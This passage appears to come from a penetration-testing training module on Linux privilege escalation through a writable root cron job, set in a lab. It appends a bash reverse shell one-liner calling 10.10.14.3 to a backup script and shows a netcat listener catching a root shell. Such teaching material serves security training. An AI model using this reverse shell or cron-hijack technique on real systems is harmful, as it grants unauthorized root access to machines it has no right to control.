We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs)

We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.

Cron Job Abuse

```shell-session
canklesmaks@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Code: bash

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!

Cron Job Abuse

```shell-session
canklesmaks@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

While not the most common attack, we do find poorly configured cron jobs that can be abused from time to time.